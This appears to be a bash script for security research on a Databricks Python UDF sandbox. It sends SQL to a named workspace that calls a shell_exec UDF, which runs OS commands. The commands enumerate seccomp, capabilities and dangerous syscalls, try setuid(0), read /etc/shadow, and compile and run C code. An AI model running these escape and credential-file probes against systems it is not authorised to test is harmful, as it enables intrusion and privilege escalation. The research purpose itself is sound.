#!/bin/bash

TOKEN="<REDACTED>"
WORKSPACE="https://dbc-54d21f62-0426.cloud.databricks.com"
WAREHOUSE_ID="<REDACTED>"

exec_sql() {
    local statement="$1"
    curl -s -X POST "$WORKSPACE/api/2.0/sql/statements" \
      -H "Authorization: Bearer $TOKEN" \
      -H "Content-Type: application/json" \
      -d "{
        \"warehouse_id\": \"$WAREHOUSE_ID\",
        \"statement\": $(echo "$statement" | python3 -c "import sys, json; print(json.dumps(sys.stdin.read()))"),
        \"wait_timeout\": \"50s\"
      }" | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    result = data.get('result', {}).get('data_array', [[]])
    if result and result[0]:
        print(result[0][0])
    else:
        print('[empty]')
except:
    print('[error]')
"
}

echo "=== DATABRICKS PYTHON UDF SANDBOX SECURITY RESEARCH ==="
echo ""

echo "[1/9] Kernel Version"
exec_sql "SELECT workspace.default.shell_exec('uname -a')"
echo ""

echo "[2/9] Seccomp Status"
exec_sql "SELECT workspace.default.shell_exec('cat /proc/self/status | grep Seccomp')"
echo ""

echo "[3/9] NoNewPrivs via prctl"
exec_sql "SELECT workspace.default.shell_exec('python3 -c \"
import ctypes
libc = ctypes.CDLL(None)
PR_GET_NO_NEW_PRIVS = 39
result = libc.prctl(PR_GET_NO_NEW_PRIVS, 0, 0, 0, 0)
print(f\\\"NoNewPrivs: {result}\\\")
\"')"
echo ""

echo "[4/9] Capabilities"
exec_sql "SELECT workspace.default.shell_exec('cat /proc/self/status | grep Cap')"
echo ""

echo "[5/9] Dangerous Syscalls Test"
exec_sql "SELECT workspace.default.shell_exec('python3 -c \"
import ctypes
libc = ctypes.CDLL(None)
syscalls = {
    \\\"perf_event_open\\\": 298,
    \\\"userfaultfd\\\": 282,
    \\\"keyctl\\\": 250,
    \\\"memfd_create\\\": 279,
    \\\"bpf\\\": 280
}
for name, num in syscalls.items():
    ret = libc.syscall(num, 0, 0, 0, 0, 0)
    print(f\\\"{name}({num}): {ret}\\\")
\"')"
echo ""

echo "[6/9] Compiler Availability"
exec_sql "SELECT workspace.default.shell_exec('which gcc g++')"
echo ""

echo "[7/9] setuid(0) Test"
exec_sql "SELECT workspace.default.shell_exec('python3 -c \"
import ctypes, os
libc = ctypes.CDLL(None)
before = os.getuid()
ret = libc.setuid(0)
after = os.getuid()
print(f\\\"UID before: {before}, setuid(0) returned: {ret}, UID after: {after}\\\")
\"')"
echo ""

echo "[8/9] /etc/shadow Access Test"
exec_sql "SELECT workspace.default.shell_exec('cat /etc/shadow 2>&1 | head -1 || echo \"[cannot read]\"')"
echo ""

echo "[9/9] Compile and Execute C Syscall Test"
exec_sql "SELECT workspace.default.shell_exec('
cat > /tmp/test.c << \"EOF\"
#include <stdio.h>
#include <sys/syscall.h>
#include <unistd.h>

int main() {
    long ret;
    ret = syscall(298, 0, 0, 0, 0, 0);
    printf(\"perf_event_open: %ld\\n\", ret);
    ret = syscall(282, 0);
    printf(\"userfaultfd: %ld\\n\", ret);
    ret = syscall(250, 0, 0, 0, 0, 0);
    printf(\"keyctl: %ld\\n\", ret);
    ret = syscall(279, \"test\", 0);
    printf(\"memfd_create: %ld\\n\", ret);
    if (ret > 0) close(ret);
    return 0;
}
EOF
gcc -o /tmp/test /tmp/test.c 2>&1 && /tmp/test
')"
echo ""

echo "=== RESEARCH COMPLETE ==="
